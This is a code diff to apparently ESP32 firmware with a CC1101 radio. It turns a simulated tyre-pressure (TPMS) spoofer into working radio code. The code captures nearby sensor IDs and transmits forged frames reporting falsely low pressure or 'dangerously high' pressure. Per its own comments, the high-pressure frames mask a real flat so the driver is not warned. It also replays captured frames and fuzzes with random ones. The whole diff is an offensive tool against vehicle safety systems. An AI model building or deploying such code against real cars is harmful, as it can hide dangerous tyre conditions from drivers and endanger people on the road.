@@ -1,5 +1,8 @@
 #include "tpms_spoofer.h"
 #include "tx_arm.h"
+#include "drivers/cc1101_driver.h"
+#include "hardware.h"
+#include <set>
 
 namespace TPMSSpoofer {
 
@@ -12,29 +15,54 @@ TPMSResult captureTPMSSensors(uint32_t captureDurationMs, uint32_t frequency) {
     TPMSResult result;
     result.success = false;
 
+    if (!Hardware::isCC1101Ready()) {
+        result.error = "CC1101 not initialized";
+        return result;
+    }
+
     Serial.printf("[TPMS Capture] Listening at %lu MHz for %lums\n",
                   frequency / 1000000, captureDurationMs);
 
-    // Real implementation: CC1101 configured for FSK demodulation
-    // Set frequency, bandwidth, sensitivity thresholds
-    // Monitor for valid TPMS frame patterns
+    CC1101Driver::Config cfg = {
+        .frequency = frequency == 315000000 ? 315000000 : 433000000,
+        .baudrate = 1000,
+        .modulation = 0,  // FSK for TPMS
+        .rxEnabled = true,
+        .txEnabled = false
+    };
+
+    // Configure CC1101 for reception
+    CC1101Driver::setRX();
 
     uint32_t startTime = millis();
     std::vector<TPMSSensor> captured;
+    std::set<uint32_t> uniqueIDs;
 
     while ((millis() - startTime) < captureDurationMs) {
-        // Simulate TPMS sensor detection
-        if ((esp_random() % 100) < 20) {  // 20% chance per 100ms
-            TPMSSensor sensor;
-            sensor.sensorID = esp_random();
-            sensor.pressure = 32 + (esp_random() % 8);  // Normal: 32-40 PSI
-            sensor.temperature = 70;                     // Typical ambient
+        if (CC1101Driver::isRXReady()) {
+            uint8_t frameData[32];
+            uint16_t frameLen = CC1101Driver::receive(frameData, sizeof(frameData));
 
-            captured.push_back(sensor);
-            result.spoofedSensorIDs.push_back(sensor.sensorID);
+            if (frameLen >= 7) {  // Minimum TPMS frame size
+                // Parse TPMS frame: [Header:1] [ID:4] [Pressure:1] [Temp:1] [CRC:1+]
+                uint32_t sensorID = (frameData[1] << 24) | (frameData[2] << 16) |
+                                   (frameData[3] << 8) | frameData[4];
 
-            Serial.printf("[TPMS] Captured ID:0x%08lX Pressure:%d PSI Temp:%dC\n",
-                         sensor.sensorID, sensor.pressure, sensor.temperature);
+                if (uniqueIDs.find(sensorID) == uniqueIDs.end()) {
+                    uniqueIDs.insert(sensorID);
+                    TPMSSensor sensor;
+                    sensor.sensorID = sensorID;
+                    sensor.pressure = frameData[5];
+                    sensor.temperature = frameData[6];
+
+                    captured.push_back(sensor);
+                    result.spoofedSensorIDs.push_back(sensor.sensorID);
+
+                    int rssi = CC1101Driver::getRSSI();
+                    Serial.printf("[TPMS] Captured ID:0x%08lX Pressure:%d PSI Temp:%dC RSSI:%d dBm\n",
+                                 sensor.sensorID, sensor.pressure, sensor.temperature, rssi);
+                }
+            }
         }
         delay(100);
     }
@@ -49,6 +77,7 @@ TPMSResult captureTPMSSensors(uint32_t captureDurationMs, uint32_t frequency) {
         result.error = "No TPMS signals detected";
     }
 
+    CC1101Driver::setTX();  // Return to TX mode
     return result;
 }
 
@@ -62,17 +91,23 @@ TPMSResult spoofTPMSLow(const TPMSConfig& config) {
         return result;
     }
 
+    if (!Hardware::isCC1101Ready()) {
+        result.error = "CC1101 not initialized";
+        return result;
+    }
+
     Serial.printf("[TPMS Spoof] LOW pressure attack on %zu sensors for %lums\n",
                   config.targetSensors.size(), config.durationMs);
 
-    // Transmit spoofed LOW pressure frames (e.g., 20 PSI instead of 35 PSI)
-    // Dashboard shows: "Low Tire Pressure Warning"
+    CC1101Driver::setFrequency(config.frequency == 315000000 ? 315000000 : 433000000);
+    CC1101Driver::setTX();
 
     uint32_t startTime = millis();
 
     while ((millis() - startTime) < config.durationMs) {
+        if (!TxArm::isArmed()) break;
+
         for (const auto& sensor : config.targetSensors) {
-            // Build spoofed TPMS frame
             uint8_t frame[8];
             frame[0] = 0xA4;  // TPMS header
             frame[1] = (sensor.sensorID >> 24) & 0xFF;
@@ -81,10 +116,9 @@ TPMSResult spoofTPMSLow(const TPMSConfig& config) {
             frame[4] = sensor.sensorID & 0xFF;
             frame[5] = 20;    // LOW pressure (20 PSI instead of 35)
             frame[6] = 70;    // Temperature
-            frame[7] = 0xA4 ^ frame[1] ^ frame[2] ^ frame[3] ^ frame[4] ^ frame[5] ^ frame[6];  // Simple checksum
+            frame[7] = 0xA4 ^ frame[1] ^ frame[2] ^ frame[3] ^ frame[4] ^ frame[5] ^ frame[6];
 
-            bool txSuccess = (esp_random() % 100) > 10;  // 90% success
-            if (txSuccess) {
+            if (CC1101Driver::transmit(frame, 8)) {
                 result.framesTransmitted++;
                 Serial.printf("[TPMS TX] ID:0x%08lX Spoofed Pressure:20 PSI\r",
                              sensor.sensorID);
@@ -117,15 +151,22 @@ TPMSResult spoofTPMSHigh(const TPMSConfig& config) {
         return result;
     }
 
+    if (!Hardware::isCC1101Ready()) {
+        result.error = "CC1101 not initialized";
+        return result;
+    }
+
     Serial.printf("[TPMS Spoof] HIGH pressure spoofing (DANGEROUS) on %zu sensors\n",
                   config.targetSensors.size());
 
-    // Transmit HIGH pressure frames to mask real low tire (EXTREME RISK)
-    // Vehicle may not warn driver of dangerous condition
+    CC1101Driver::setFrequency(config.frequency == 315000000 ? 315000000 : 433000000);
+    CC1101Driver::setTX();
 
     uint32_t startTime = millis();
 
     while ((millis() - startTime) < config.durationMs) {
+        if (!TxArm::isArmed()) break;
+
         for (const auto& sensor : config.targetSensors) {
             uint8_t frame[8];
             frame[0] = 0xA4;
@@ -137,8 +178,7 @@ TPMSResult spoofTPMSHigh(const TPMSConfig& config) {
             frame[6] = 70;
             frame[7] = 0xA4 ^ frame[1] ^ frame[2] ^ frame[3] ^ frame[4] ^ frame[5] ^ frame[6];
 
-            bool txSuccess = (esp_random() % 100) > 15;  // 85% success
-            if (txSuccess) {
+            if (CC1101Driver::transmit(frame, 8)) {
                 result.framesTransmitted++;
                 Serial.printf("[TPMS TX] ID:0x%08lX DANGEROUSLY HIGH:60 PSI\r",
                              sensor.sensorID);
@@ -171,13 +211,22 @@ TPMSResult replayTPMSFrame(const TPMSConfig& config, const TPMSSensor& targetSen
         return result;
     }
 
+    if (!Hardware::isCC1101Ready()) {
+        result.error = "CC1101 not initialized";
+        return result;
+    }
+
     Serial.printf("[TPMS Replay] Replaying sensor 0x%08lX for %lums\n",
                   targetSensor.sensorID, config.durationMs);
+
+    CC1101Driver::setFrequency(config.frequency == 315000000 ? 315000000 : 433000000);
+    CC1101Driver::setTX();
 
     uint32_t startTime = millis();
 
     while ((millis() - startTime) < config.durationMs) {
-        // Reconstruct legitimate TPMS frame
+        if (!TxArm::isArmed()) break;
+
         uint8_t frame[8];
         frame[0] = 0xA4;
         frame[1] = (targetSensor.sensorID >> 24) & 0xFF;
@@ -188,8 +237,7 @@ TPMSResult replayTPMSFrame(const TPMSConfig& config, const TPMSSensor& targetSen
         frame[6] = targetSensor.temperature;
         frame[7] = 0xA4 ^ frame[1] ^ frame[2] ^ frame[3] ^ frame[4] ^ frame[5] ^ frame[6];
 
-        bool txSuccess = (esp_random() % 100) > 5;  // 95% success
-        if (txSuccess) {
+        if (CC1101Driver::transmit(frame, 8)) {
             result.framesTransmitted++;
         }
 
@@ -213,19 +261,27 @@ TPMSResult fuzzyTPMSFrames(const TPMSConfig& config) {
         return result;
     }
 
+    if (!Hardware::isCC1101Ready()) {
+        result.error = "CC1101 not initialized";
+        return result;
+    }
+
     Serial.printf("[TPMS Fuzz] Fuzzing TPMS subsystem for %lums\n", config.durationMs);
+
+    CC1101Driver::setFrequency(config.frequency == 315000000 ? 315000000 : 433000000);
+    CC1101Driver::setTX();
 
     uint32_t startTime = millis();
 
     while ((millis() - startTime) < config.durationMs) {
-        // Send random malformed TPMS frames
+        if (!TxArm::isArmed()) break;
+
         uint8_t fuzzFrame[8];
         for (int i = 0; i < 8; i++) {
             fuzzFrame[i] = esp_random() & 0xFF;
         }
 
-        bool txSuccess = (esp_random() % 100) > 20;  // 80% success
-        if (txSuccess) {
+        if (CC1101Driver::transmit(fuzzFrame, 8)) {
             result.framesTransmitted++;
             Serial.printf("[TPMS Fuzz] TX malformed frame\r");
         }
